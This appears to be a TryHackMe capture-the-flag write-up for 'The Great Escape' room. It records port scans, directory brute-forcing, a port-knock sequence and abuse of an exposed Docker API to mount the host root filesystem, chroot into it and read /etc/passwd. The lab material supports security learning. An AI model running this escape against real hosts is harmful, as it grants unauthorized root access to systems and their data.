# The Great Escape

**Room Link:** [https://tryhackme.com/r/room/thegreatescape](https://tryhackme.com/r/room/thegreatescape)



## Initial Scan <a href="#initial-scan" id="initial-scan"></a>

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Scan all ports <a href="#scan-all-ports" id="scan-all-ports"></a>

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP <a href="#tcp-8080-http" id="tcp-8080-http"></a>

Its returning too much from 200 so we need to filter it out

**Kali**

```
gobuster -e dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt --wildcard
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

Had to add .well-known to the wordlist, wasn't in any of Tryhackme's default wordlists

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/dirb/common.txt  --wildcard  -s"204,301,302,307,401,403"
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

None of this was working, try later.

**Kali**

```
dirb http://$VICTIM/.well-known -X .txt
```

**Kali**

```
curl http://$VICTIM/.well-known/security.txt
```

**Kali**

```
curl http://$VICTIM/api/fl46
```

**Kali**

```
curl http://$VICTIM/robots.txt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (862).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (863).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (865).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (866).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (868).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/grongor/knock.git
cd knock
./knock $VICTIM 42 1337 10420 6969 63000
nmap $VICTIM -p 2375
```

<figure><img src="../../.gitbook/assets/image (870).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
subl /etc/docker/daemon.json
```

**daemon.json**

```
{
  "insecure-registries" : ["10.10.90.88:2375"]
}
```

**Kali**

```
sudo systemctl stop docker
```

Wait 30 seconds

**Kali**

```
sudo systemctl start docker
```

**Kali**

```
docker -H $VICTIM:2375 images
docker -H $VICTIM:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>

